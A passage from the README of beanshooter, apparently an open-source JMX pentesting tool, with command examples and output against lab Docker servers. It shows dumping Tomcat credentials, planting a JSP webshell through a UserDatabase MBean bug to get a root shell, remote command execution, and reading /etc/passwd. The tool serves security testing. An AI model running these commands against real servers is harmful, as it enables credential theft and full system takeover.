The *FlightRecorderMXBean* provides an interface for managing the *Flight Recorder*
and supports some methods that are interesting from an offensive prespective.

#### Recoder new

The `new` operation starts a new recording. The returned recording ID can be used as a target
for other operations:

```console
[qtc@devbox ~]$ beanshooter recorder new 172.17.0.2 1090
[+] Requesting new recording on the MBeanServer.
[+] New recording created successfully with ID: 1
```

#### Recoder start

The `start` action starts an already existing recording and expects the recording ID as an additional argument:

```console
[qtc@devbox ~]$ beanshooter recorder start 172.17.0.2 1090 1
[+] Recording with ID 1 started successfully.
```

#### Recoder dump

While an recording is active, its contents can be dumped using the `dump` action. This stores the recording
information in a dump file on the *JMX server*:

```console
[qtc@devbox ~]$ beanshooter recorder dump 172.17.0.2 1090 1 /tmp/dump.dat
[+] Recording with ID 1 was successfully dumped to /tmp/dump.dat
```

#### Recorder stop

The `stop` action can be used to stop a recording:

```console
[qtc@devbox ~]$ beanshooter recorder stop 172.17.0.2 1090 1
[+] Recording with ID 1 stopped successfully.
```

#### Recorder save

After a recording was stopped, it can be saved using the `save` action. In contrast to the `dump` action,
this saves the recording on the local machine instead on the application server.

```console
[qtc@devbox ~]$ beanshooter recorder save 172.17.0.2 1090 1 recording.dat
[+] Saving recording with ID: 1
[+] Writing recording data to: /home/qtc/recording.dat
```


### Tomcat

---

The `tomcat` operation interacts with the `MemoryUserDatabaseMBean` of *Apache Tomcat*. This *MBean* provides access to user
accounts that are available on a *Tomcat* service.

#### Tomcat Dump

The `dump` action dumps usernames and passwords available on the *Tomcat* server into local files.
When invoked with a single argument, credentials are dumped in `<username>:<password>` format:

```console
[qtc@devbox ~]$ beanshooter tomcat dump 172.17.0.2 1090 creds.txt
[+] Dumping credentials...
[+] Users dumped to /home/qtc/creds.txt
[qtc@devbox ~]$ cat creds.txt
manager:P@55w0rD#
admin:s3cr3T!$
status:cr@cKM3o.O
```

When invoked with two arguments, usernames are stored in the first specified location, passwords
in the second one:

```console
[qtc@devbox ~]$ beanshooter tomcat dump 172.17.0.2 1090 users.txt passwords.txt
[+] Dumping credentials...
[+] Users dumped to /home/qtc/users.txt
[+] Passwords dumped to /home/qtc/passwords.txt
```

#### Tomcat List

The `list` operation lists available user accounts, their associated roles and credentials:

```console
[qtc@devbox ~]$ beanshooter tomcat list 172.17.0.2 1090
[+] Listing tomcat users:
[+]
[+] 	----------------------------------------
[+] 	Username:  manager
[+] 	Password:  P@55w0rD#
[+] 	Roles:
[+] 		   Users:type=Role,rolename="manager-gui",database=UserDatabase
[+] 		   Users:type=Role,rolename="manager-script",database=UserDatabase
[+] 		   Users:type=Role,rolename="manager-jmx",database=UserDatabase
[+] 		   Users:type=Role,rolename="manager-status",database=UserDatabase
[+]
[+] 	----------------------------------------
[+] 	Username:  admin
[+] 	Password:  s3cr3T!$
[+] 	Roles:
[+] 		   Users:type=Role,rolename="admin-gui",database=UserDatabase
[+] 		   Users:type=Role,rolename="admin-script",database=UserDatabase
[+]
[+] 	----------------------------------------
[+] 	Username:  status
[+] 	Password:  cr@cKM3o.O
[+] 	Roles:
[+] 		   Users:type=Role,rolename="manager-status",database=UserDatabase
```

#### Tomcat Write

The `write` operation writes a partially controlled file to an arbitrary location on the application
server. This action can be used to reliably deploy a webshell on a *Tomcat* service:

```console
[qtc@devbox ~]$ beanshooter tomcat write 172.17.0.2 1090 /opt/webshell-cli/webshells/webshell.jsp /usr/local/tomcat/webapps/ROOT/shell.jsp
[+] Writing local file /opt/webshell-cli/webshells/webshell.jsp to server location /usr/local/tomcat/webapps/ROOT/shell.jsp
[+] 	Current user database is at conf/tomcat-users.xml
[+] 	Current user database is readonly
[+] 	Adjusting readonly property to make it writable.
[+] 	Changing database path to /usr/local/tomcat/webapps/ROOT/shell.jsp
[+] 	Creating new role containing the local file content.
[+] 	Saving modified user database.
[+] 	Restoring readonly property.
[+] 	Restoring pathname property.
[+] All done.
[qtc@devbox ~]$ webshell-cli http://172.17.0.2:8080/shell.jsp
[root@d475fdb21692 /usr/local/tomcat]$ id
uid=0(root) gid=0(root) groups=0(root)
```

The `write` action abuses an encoding bug within the *UserDatabase MBean* of *Apache Tomcat*. We reported
the bug, but it was not considered a security vulnerability. For writing to arbitrary locations, *beanshooter*
needs to change the location of the *UserDatabase*. All changes are restored, after the desired file was written,
but still be careful in production environments.


### Tonka

---

The *TonkaBean* is a custom *MBean* that is implemented by the *beanshooter* project and allows
file system access and command execution on the *JMX* server. Its actions can be accessed by
using the `tonka` operation, followed by the desired action.

#### Tonka Exec

The `exec` action can be used to invoke a single command on the *JMX* service:

```console
[qtc@devbox ~]$ beanshooter tonka exec 172.17.0.2 9010 id
[+] Invoking the executeCommand method with argument: id
[+] The call was successful
[+]
[+] Server response:
uid=0(root) gid=0(root) groups=0(root)
```

The last argument of the exec operation is expected to be a string. When the `--shell` option is not
used, this string is split on spaces (quotes aware) and passed as an array to the `ProcessBuilder`
class on the server side.

If `--shell` was used, the specified shell string is split on spaces and the resulting array is
joined with the specified argument string before passing it to the `ProcessBuilder` class. This
allows shell like execution with correctly interpreted shell special characters:

```console
[qtc@devbox ~]$ beanshooter tonka exec 172.17.0.2 9010 --shell 'ash -c' 'echo $HOSTNAME'
[+] Invoking the executeCommand method with argument: ash -c echo $HOSTNAME
[+] The call was successful
[+]
[+] Server response:
fee2d783023b
```

For convenience, common shells are automatically suffixed with the required command string argument.
Therefore, `--shell ash` is automatically converted to `--shell 'ash -c'`.

#### Tonka Execarray

The `execarray` operation is very similar to the `exec` action, but instead of expecting a string as argument
and splitting this string on spaces to construct the command array, the `execarray` operation allows multiple
arguments to be specified that are used directly as the command array for the `ProcessBuilder` class:

```console
[qtc@devbox ~]$ beanshooter tonka execarray 172.17.0.2 9010 -- ash -c 'echo $HOME'
[+] Invoking the executeCommand method with argument: ash -c echo $HOME
[+] The call was successful
[+]
[+] Server response:
/root
```

#### Tonka Shell

The `shell` action spawns a command shell where you can specify commands that are executed on the *JMX*
server. The shell is not fully interactive and just represents a wrapper around *Javas* `Runtime.exec`
method. However, basic support for environment variables and a current working directory is implemented:

```console
[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010
[root@172.17.0.2 /]$ id
uid=0(root) gid=0(root) groups=0(root)
[root@172.17.0.2 /]$ cd /home
[root@172.17.0.2 /home]$ !env test=example
[root@172.17.0.2 /home]$ echo $test
example
```

The example above demonstrates how to set environment variables using the `!env` keyword. Apart from this
keyword, several others are available:

```console
[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010
[root@172.17.0.2 /]$ !help
Available shell commands:
  <cmd>                        execute the specified command
  cd <dir>                     change working directory on the server
  exit|quit                    exit the shell
  !help|!h                     print this help menu
  !environ|!env <key>=<value>  set new environment variables in key=value format
  !upload|!put <src> <dst>     upload a file to the remote MBeanServer
  !download|!get <src> <dst>   download a file from the remote MBeanServer
  !background|!back <cmd>      executes the specified command in the background
```

#### Tonka Upload

The `upload` action can be used to upload a file to the *JMX* server:

```console
[qtc@devbox ~]$ beanshooter tonka upload 172.17.0.2 9010 file.dat /tmp
[+] Uploading local file /home/qtc/file.dat to path /tmp on the MBeanSerer.
[+] 33 bytes were written to /tmp/file.dat
```

#### Tonka Download

The `download` action can be used to download a file from the *JMX* server:

```console
[qtc@devbox ~]$ beanshooter tonka download 172.17.0.2 9010 /etc/passwd
[+] Saving remote file /etc/passwd to local path /home/qtc/passwd
[+] 1172 bytes were written to /home/qtc/passwd
```


### JMXMP

---

*JMX* services can use different connector types. The by far most commonly used connector is *Java RMI*, which
allows access to *JMX* based on the *Java RMI* protocol. Another popular connector is the *JMX Message Protocol*
(*JMXMP*) that, despite being outdated, is still encountered quite often. *beanshooter* has builtin *JMXMP* support
and attempts to connect via *JMXMP* when using the `--jmxmp` option:

```console
[qtc@devbox ~]$ beanshooter enum 172.17.0.2 4444 --jmxmp
[+] Checking servers SASL configuration:
[+]
[+] 	- Remote JMXMP server does not use SASL.
[+] 	  Login is possible without specifying credentials.
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+] 	- JMXMP serial check is work in progress but endpoints are usually vulnerable.
[+] 	  Configuration Status: Undecided
[+]
[+] Checking available MBeans:
[+]
[+] 	- 22 MBeans are currently registred on the MBean server.
[+] 	  Found 0 non default MBeans.
```

Authenticated *JMXMP* endpoints are usually protected using *SASL*. With *SASL* enabled, a *JMX* endpoint usually requires
the client to connect with a specific *SASL Profile*. Available profiles for *beanshooter* are:

* plain
* digest
* cram
* ntlm
* gssapi

Each of them can optionally be paired with *TLS* by using the `--ssl` option. When using the `enum` action on a *SASL* protected
*JMXMP* endpoint, *beanshooter* attempts to enumerate the required *SASL* profile. Whereas determining the required *SASL*
mechanism is usually possible, the required *TLS* setting cannot be enumerated:

```console
[qtc@devbox ~]$ beanshooter enum 172.17.0.2 4449 --jmxmp
[+] Checking servers SASL configuration:
[+]
[+] 	- Remote JMXMP server uses SASL/NTLM SASL profile.
[+] 	  Notice: TLS setting cannot be enumerated and --ssl may be required.
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+] 	- JMXMP serial check is work in progress but endpoints are usually vulnerable.
[+] 	  Configuration Status: Undecided
```


### Example Server

---

![](https://github.com/qtc-de/beanshooter/workflows/example%20server%20-%20master/badge.svg?branch=master)
![](https://github.com/qtc-de/beanshooter/workflows/example%20server%20-%20develop/badge.svg?branch=develop)

Most of the examples presented above are based on the [jmx-example-server](https://github.com/qtc-de/beanshooter/pkgs/container/beanshooter%2Fjmx-example-server)
and the [tomcat-example-server](https://github.com/qtc-de/beanshooter/pkgs/container/beanshooter%2Ftomcat-example-server).
These servers are contained within this repository in the [docker](/docker) folder and can be used to practice *JMX* enumeration.
You can either build the corresponding containers yourself or load them directly from the *GitHub Container Registry*.

Copyright 2022, Tobias Neitzel and the *beanshooter* contributors.
